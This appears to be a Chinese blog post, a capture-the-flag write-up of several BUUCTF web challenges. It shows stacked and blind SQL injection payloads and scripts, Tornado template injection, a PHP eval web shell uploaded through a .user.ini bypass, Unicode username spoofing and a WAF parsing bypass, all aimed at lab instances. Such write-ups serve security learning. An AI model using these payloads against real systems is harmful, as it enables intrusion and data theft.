@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    BUU-WEB（一） |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-adhlix" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      BUU-WEB（一）
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/20/adhlix/" class="article-date">
+  <time datetime="2020-02-20T09:18:10.000Z" itemprop="datePublished">2020-02-20</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>本来一题一篇文章，结果发现太浪费了，所以整合起来了，</p>
+<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>随便输入一个单引号，报错<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=206&originWidth=1759&size=0&status=done&style=none&width=1042" alt=""></p>
+<p>order by 3 就不行了<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298100-06781bef-d530-4026-bac8-bcd656294898.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&originHeight=210&originWidth=555&size=0&status=done&style=none&width=499" alt=""></p>
+<p>尝试联合查询的时候出现提示：<br>“/select|update|delete|drop|insert|where|./i”<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298088-df3aa016-4844-4f97-8a1c-8c5c21b9110f.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&originHeight=175&originWidth=811&size=0&status=done&style=none&width=811" alt=""></p>
+<p>一个正则可视化网站：<a href="https://regexper.com" target="_blank" rel="noopener">https://regexper.com</a><br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298053-73ea4a24-252e-4c4f-8f8e-cb1796babd8b.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&originHeight=903&originWidth=1118&size=0&status=done&style=none&width=559" alt=""></p>
+<p>使用堆叠注入：1’;show tables;#<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298128-71010914-7be7-4909-8cfb-188bc5f87b58.png#align=left&display=inline&height=567&margin=%5Bobject%20Object%5D&originHeight=567&originWidth=493&size=0&status=done&style=none&width=493" alt=""></p>
+<p>看一下表里有什么列名：1’;show columns from <code>1919810931114514</code>;#<br>（注意，字符串为表名的表操作时要加反引号）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298122-319cf83c-e4ed-4844-825d-639e4cfac894.png#align=left&display=inline&height=607&margin=%5Bobject%20Object%5D&originHeight=607&originWidth=368&size=0&status=done&style=none&width=368" alt=""></p>
+<p>但是没办法使用 select * from <code>1919810931114514</code><br>看网上师傅们有两种方法，第一种：<strong>mysql 预定义语句</strong><br><strong>1</strong>‘;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;Prepare execsql from @a;execute execsql;#</p>
+<p>hex decode 以后是：?inject=1’;SeT@a=select * from <code>**1919810931114514**</code>;Prepare execsql from @a;execute execsql;#</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298106-9393a75f-e1f4-49c4-a82c-17b8a2f17ead.png#align=left&display=inline&height=309&margin=%5Bobject%20Object%5D&originHeight=606&originWidth=1246&size=0&status=done&style=none&width=635" alt=""></p>
+<p>还有一种方法时是：<strong>改表名  **这样查询的时候就可以查询到 flag<br>?inject=</strong>1**’;<br>rename tables <code>words</code> to <code>test</code>;rename tables <code>1919810931114514</code> to <code>words</code>;<br>alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#</p>
+<p>意思分别是：把  words  表改名为 test，把 1919810931114541  改名为  words<br>把列名 flag  改为 id</p>
+<p>这样在 1’; or 1=1# 查询的时候就会把所有的都列出来，这样就可以看到 flag  了<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298281-e70d996d-bdc2-46a1-847f-e7fb9dbb00f6.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&originHeight=253&originWidth=639&size=0&status=done&style=none&width=639" alt=""></p>
+<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>打开看到有三个文件：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298252-e06ca652-0d67-4a6b-a567-4c2f203196be.png#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&originHeight=283&originWidth=663&size=0&status=done&style=none&width=534" alt=""></p>
+<p>三个文件内容如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298186-1dd07d54-87e3-4052-9111-369d5a99e530.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&originHeight=130&originWidth=218&size=0&status=done&style=none&width=210" alt=""><br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298074-6cad8b42-317a-4e42-ae6b-bc36c2e1e14a.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&originHeight=103&originWidth=170&size=0&status=done&style=none&width=170" alt=""><br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298110-183b7d1b-bf44-45fb-8342-24311468d632.png#align=left&display=inline&height=98&margin=%5Bobject%20Object%5D&originHeight=127&originWidth=395&size=0&status=done&style=none&width=305" alt=""></p>
+<p>通过 url 知道，访问一个文件需要知道：filename  跟  filehash</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298160-6b4634f5-99aa-4f78-a94f-facc6ea2218d.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=1243&size=0&status=done&style=none&width=746" alt=""></p>
+<p>企图直接访问是不行的，想到了 burp  抓包，但是抓了半天没抓到，看了网上的 wp  是 <strong>模版注入</strong><br>**<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298259-b3411ff4-7dbe-4601-a2f1-2f484ca529e9.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&originHeight=240&originWidth=1076&size=0&status=done&style=none&width=687" alt=""></p>
+<p>tornado 是一个 python 的模板，welcome.txt  中的  render  是 python  中的一个渲染函数，<br>报错时候的 url  是这样的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298103-d507818f-47f7-40db-9971-d155a481cfa3.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=248&originWidth=795&size=0&status=done&style=none&width=660" alt=""></p>
+<p>尝试把后面换成：<code>111</code>，输出了！</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298371-a461eea1-6a9b-45a7-96e8-9cbc5321dd87.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&originHeight=217&originWidth=806&size=0&status=done&style=none&width=806" alt=""></p>
+<p>在 tornado 模板中，存在一些可以访问的快速对象，例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">  &#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么输入：<code>****</code><br>**<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298335-26629580-adc0-407f-9b0f-cdaf0eeec081.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&originHeight=305&originWidth=1740&size=0&status=done&style=none&width=1164" alt=""></p>
+<p>拿到 cookie 就 OK 了！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5value</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(s)</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jiami</span><span class="params">()</span>:</span></span><br><span class="line">    filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie_s =<span class="string">"ea7d75de-4ca5-486a-a69c-e690f3a8c217"</span></span><br><span class="line">    print(md5value(filename.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">    x=md5value(filename.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    y=cookie_s+xprint(md5value(y.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">jiami()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298337-2b7fe544-a6db-47a8-b6a4-4426c056d5ad.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=265&originWidth=1238&size=0&status=done&style=none&width=1037" alt=""></p>
+<h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>这道题目有两种解法，一种是：<strong>*,1</strong>，这样查询结果会把表中所有的数据返回来（据说是非预期解，出题人可能忘记过滤掉*了）<br>还有一种说是考察 sql_mode，通过堆叠注入修改 sql_mode，<br>可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT  来实现将 <code>||</code> 视为字符串连接符而非   或   运算符<br>因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag</p>
+<p>Payload :<br>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1<br>拼接后就变成了<br>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</p>
+<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>访问提示源码在 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298329-2978242a-bbc1-4494-8946-b60ae1860d2f.png#align=left&display=inline&height=176&margin=%5Bobject%20Object%5D&originHeight=327&originWidth=1146&size=0&status=done&style=none&width=617" alt=""></p>
+<p>在网址后面加上 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>  是可以下载下来的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298347-12a9e4e8-7d99-45ff-819b-8b75436caab9.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=620&originWidth=1250&size=0&status=done&style=none&width=891" alt=""></p>
+<p>下下来里面超级多 php 文件，用大佬的  python  脚本筛选出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'D:/anquan/localtest/PHPTutorial/WWW/CTFtraining/BUUCTF/src/'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'D:/anquan/localtest/PHPTutorial/WWW/CTFtraining/BUUCTF/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">'echo "got it"'</span></span><br><span class="line">            flag = <span class="string">'got it'</span></span><br><span class="line">            <span class="comment"># command = 'phpinfo();'</span></span><br><span class="line">            <span class="comment"># flag = 'phpinfo'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">'http://127.0.0.1/CTFtraining/BUUCTF/src/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"got it"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">'http://127.0.0.1/CTFtraining/BUUCTF/src/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"got it"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>我参考的网上的 wp  直接把 x 开头之前的  php  文件删掉了，不然要跑很长时间（php  版本要用 7  以上的）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298345-bd055ae4-c1c2-4087-8a48-c35f0f1c635f.png#align=left&display=inline&height=149&margin=%5Bobject%20Object%5D&originHeight=149&originWidth=783&size=0&status=done&style=none&width=783" alt=""></p>
+<p>访问  xk0SzyKwfzw.php?Efa5BVG= cat /flag  得到 flag<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298399-386dba62-536d-4f74-8fe0-c2b29446b7ec.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&originHeight=405&originWidth=1911&size=0&status=done&style=none&width=1102" alt=""></p>
+<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>网上的  wp  有三个方法，这里只记录一个，Unicode 欺骗<br><a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p>
+<p>注册用户：ᴬdmin<br>会将其变成：Admin<br>修改密码的时候会变成：admin<br>这样就可以直接访问 admin 用户</p>
+<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>拿到题目，是一个上传界面<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298336-26c74407-7e56-4b09-9097-c0db8d9121f4.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=222&originWidth=395&size=0&status=done&style=none&width=395" alt=""></p>
+<p>尝试上传，php 显示非法后缀，传图马显示内容里面有 &lt;?<br>尝试这样的：</p>
+<blockquote>
+<p>GIF89a</p>
+<script language="php">eval ($_POST['yichen']);</script>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298417-f4a90eb9-b665-4af4-ada8-22738f451b93.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&originHeight=196&originWidth=722&size=0&status=done&style=none&width=722" alt=""></p>
+<p>成功上传，同时还显示了文件夹下的内容<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298466-d2bb36a7-07f4-41ab-97f9-9cfadcdea7d4.png#align=left&display=inline&height=173&margin=%5Bobject%20Object%5D&originHeight=257&originWidth=1116&size=0&status=done&style=none&width=751" alt=""></p>
+<p>想上传 .htaccess  把图片马解析成为  php  但是失败了<br>看  wp 以后学到了 .user.ini  来上传后门<br>了解一下，先从 php.ini 说起  php.ini  是  php  的默认配置文件，其中包括了很多  php  的配置<br>其中 PHP_INI_USER 的配置项，可以在 ini_set () 函数中设置、注册表中设置，再就是.user.ini 中设置可以理解为  php  是允许用户自定义的  php.ini<br>实际上，除了 <code>PHP_INI_SYSTEM</code> 以外的模式（包括 PHP_INI_ALL）都是可以通过.user.ini 来设置的<br>而且  php.ini  是种动态加载的  ini  文件，不需要重启服务，只需要等待<code>user_ini.cache_ttl</code> 所设置的时间（默认 300 秒）就可以<br>需要看的是这两个选项，它们的作用是指定一个文件，会自动把这个文件包含在其他要执行的文件里面，相当于 require()<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298491-3df9bf54-a677-4591-aefa-0a442b890b40.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&originHeight=181&originWidth=1059&size=0&status=done&style=none&width=1059" alt=""></p>
+<p>使用方法很简单，只需要在 .user.ini  文件中写：<br>auto_prepend_file=文件名（比如：yichen.jpg）</p>
+<p>解题：先上传一个 .user.ini  文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298436-3ea6e979-6a2e-4737-b083-78320f548bae.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&originHeight=152&originWidth=424&size=0&status=done&style=shadow&width=424" alt=""></p>
+<p>在上传一个  yichen.jpg 文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1.png#align=left&display=inline&height=156&margin=%5Bobject%20Object%5D&originHeight=156&originWidth=473&size=0&status=done&style=shadow&width=473" alt=""></p>
+<p>然后在访问同一文件夹下的 index.php  就可以得到 flag  了</p>
+<h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>sql 注入题目，通过基于时间的盲注可以测出来，但是不会写脚本，懒得一个一个测，看了师傅们的 wp<br>  师傅们用了 异或   这种操作，长见识了，师傅们的 WP：<br>（意识到应该整理一些  sqli  的 FUZZ  字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://af100f25-ad84-449a-98cc-64ef4e7fda40.node3.buuoj.cn"</span></span><br><span class="line">    flag=<span class="string">"Hello, glzjin wants a girlfriend."</span></span><br><span class="line">    final=<span class="string">""</span></span><br><span class="line">    stop=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">         print(<span class="string">"*"</span>*<span class="number">50</span>,i,<span class="string">"*"</span>*<span class="number">50</span>)</span><br><span class="line">         stop=<span class="number">0</span></span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;<span class="string">"id"</span>:<span class="string">"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))"</span> %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">             html = etree.HTML(re).xpath(<span class="string">"//text()"</span>)</span><br><span class="line">             <span class="comment"># print("&gt;&gt;",html)</span></span><br><span class="line">             <span class="keyword">if</span> flag <span class="keyword">in</span> html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(<span class="string">"\n\t\t\t\t"</span>,final)</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">         <span class="keyword">if</span> stop &gt;= <span class="number">128</span>:</span><br><span class="line">            print(<span class="string">"*"</span>*<span class="number">50</span>,<span class="string">"结束"</span>)</span><br><span class="line">            print(<span class="string">"&gt;&gt;"</span>,final)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Easy-Cacl"><a href="#Easy-Cacl" class="headerlink" title="Easy Cacl"></a>Easy Cacl</h1><p>** PHP  字符串解析特性**：<br>  当 php  查询字符串进行解析的时候会将某些字符删除或用下划线代替<br>参考：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&originHeight=408&originWidth=1105&size=0&status=done&style=none&width=720" alt=""></p>
+<p>在 freebuf 的文章中，发现了上面这些是可以被用来替换的<br>用到这道题目上来， WAF  的存在使得没法给  num  传字符，但是如果在  num 前面加上个空格，那样 WAF 在检测的时候就不会检测到 num  这个参数，但是 PHP 在解析的时候会把空格删掉，这样就可以命令执行了，同时  calc.php  中还有个黑名单，可以使用  chr()  来绕过<br>查看目录<br>calc.php? num=1;var_dump(scandir(chr(47)))<br>查看  flag<br>calc.php? num=1;var_dump(readfile(chr(47).f1agg))<br>不太明白为啥直接 f1agg 不行</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/20/adhlix/" data-id="ckco614uk0000o8u93ol15fk8" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/02/22/pzhqyf/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            Linux系统
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/02/19/heis24/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">curl使用</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
